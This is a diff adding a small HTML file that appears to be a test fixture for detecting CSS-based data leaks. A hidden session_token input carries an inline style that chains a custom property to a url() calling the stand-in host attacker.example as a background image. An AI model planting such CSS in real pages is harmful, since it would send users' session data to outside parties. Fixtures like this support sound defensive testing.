@@ -1,0 +1,7 @@
+<!doctype html>
+<html>
+<head><title>Inline style custom property URL chain</title></head>
+<body>
+  <input type="hidden" name="session_token" value="efgh1234efgh1234efgh1234" style="--css-sentry-leak:url(https://attacker.example/inline-var); background-image:var(--css-sentry-leak)">
+</body>
+</html>
